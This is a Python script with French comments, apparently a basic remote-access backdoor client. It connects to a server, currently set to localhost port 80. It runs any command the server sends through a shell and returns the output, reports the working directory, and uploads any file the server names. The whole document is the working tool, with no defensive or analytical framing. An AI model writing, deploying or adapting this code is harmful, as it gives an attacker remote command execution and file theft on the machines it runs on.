#Les imports 
import  socket
import  os
import  subprocess
from time  import sleep
import  json
# Creation du socket pour l’envoi et la réception des messages

IP = socket.gethostbyname("localhost")
PORT = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(PORT)))
s.send("start  !".encode())

class Client:
    def __init__(self,  DATA):
        self.DATA = DATA
    def verifications(DATA):
        if(DATA  == str.encode("command")):
            command  = s.recv(1024)
            Client.command(command.decode("latin1"))
        if(DATA  == str.encode("home")):
            s.send(os.getcwd().encode())
        if(DATA  == str.encode("exit")):
            s.close()
            exit()
        if(DATA  == str.encode("filesend")):
            Client.send_archive(DATA)
    
    def command(DATA):
        sub=subprocess.Popen(DATA,shell=True,stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,stdin=subprocess.PIPE)
        output=sub.stderr.read()+sub.stdout.read()
        s.send(output)

    def send_archive(DATA):
        print("Envoi de fichiers...")
        s.send("Quel fichier transférer ? : ".encode())
        filename = s.recv(1024).decode()
        with open(filename, "rb") as f:
            content= f.read()
            s.send(content)

while True:
    try:
        rcvc = s.recv(1024)
        Client.verifications(rcvc)
    except KeyboardInterrupt:
        s.close()
        exit()